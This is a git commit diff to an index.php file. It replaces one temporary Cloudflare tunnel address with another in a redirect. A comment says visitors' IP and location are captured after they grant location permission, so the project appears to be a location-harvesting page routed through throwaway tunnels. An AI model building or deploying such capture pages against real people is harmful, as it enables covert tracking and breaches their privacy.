58908abcf59c167a2749bb8a3c871de29a255d1b
Sydney Ricafort <51870127+devsyd11@users.noreply.github.com>
2026-03-19 06:50:02 +0800

    added web ui

--- index.php
+++ index.php
@@ -1,5 +1,5 @@
 <?php
 // IP/location captured only AFTER user responds to location permission (via location-submit.php)
-header('Location: https://skilled-zoo-librarian-gem.trycloudflare.com/index2.html');
+header('Location: https://hampshire-contamination-enhancements-scoop.trycloudflare.com/index2.html');
 exit
 ?>
